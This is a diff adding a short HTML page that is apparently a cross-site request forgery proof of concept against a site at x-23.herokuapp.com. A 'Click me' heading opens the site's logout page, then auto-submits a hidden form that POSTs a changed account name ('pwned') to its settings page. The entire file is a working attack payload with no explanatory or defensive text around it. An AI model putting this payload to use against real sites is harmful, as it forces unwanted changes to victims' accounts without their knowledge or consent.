@@ -1,0 +1,14 @@
+<script>
+function go(){
+let w = window.open("https://x-23.herokuapp.com/hi/logout.html",'');
+setTimeout(function(){w.close();csrf.submit()},1000)
+}
+</script>
+
+<h1 onclick=go()>Click me</h1>
+
+<form style="display:none" name=csrf 
+method=post action="https://x-23.herokuapp.com/hi/settings.php">
+<input name=new_name value="pwned">
+<input type=submit>
+</form>
